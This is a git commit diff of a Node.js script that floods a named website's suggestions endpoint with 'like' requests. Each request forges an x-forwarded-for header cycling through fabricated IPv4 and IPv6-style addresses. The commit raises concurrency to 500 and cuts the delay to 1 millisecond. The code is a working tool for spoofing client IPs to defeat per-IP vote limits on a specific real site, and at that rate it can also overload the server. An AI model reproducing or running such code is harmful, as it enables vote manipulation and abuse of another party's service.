997b9ff94f1e41e900b99b6c30c2b318f3b1d639
root <vapciogaming@gmail.com>
2019-12-11 15:42:13 +0100

    lol

--- index.js
+++ index.js
@@ -1,26 +1,29 @@
 var request = require("request");
 
 async function xd() {
-    var limit = 30;
+    var limit = 500;
     var pending = 0;
-    for (let i = 1; i < 100; i++) {
-        for (let j = 1; j < 100; j++) {
-            for (let k = 1; k < 100; k++) {
+    var beg = parseInt(Math.random() * 252) + 1;
+    for (let i = 1; i < 254; i++) {
+        for (let j = 1; j < 254; j++) {
+            beg = parseInt(Math.random() * 252) + 1;
+            for (let k = 1; k < 254; k++) {
                 if(pending < limit) {
                     let options = {
                         method: 'GET',
                         url: 'https://ceapa.cool/suggestions/',
-                        qs: {like: '19'},
-                        headers: {'x-forwarded-for': "178." + i + "." + j + "." + k},
+                        qs: {like: '613'},
+                        headers: {'x-forwarded-for': "2001:1b8:85a3:813:1319:112e:310:" + beg + "." + i + "." + j + "." + k},
+                        followRedirect: false
                     };
-                    console.log("sending from ip: " + options.headers['x-forwarded-for']);
+                    console.log("s: " + options.headers['x-forwarded-for']);
                     request(options, function (error, response) {
                         pending--;
-                        console.log("result from ip: " + options.headers['x-forwarded-for'] + ": " + (error ? error.message : response.statusCode));
+                        console.log("r: " + options.headers['x-forwarded-for'] + ": " + (error ? error.message : response.statusCode));
                     });
                     pending++;
                 }
-                await new Promise(resolve => setTimeout(resolve, 100));
+                await new Promise(resolve => setTimeout(resolve, 1));
             }
         }
     }
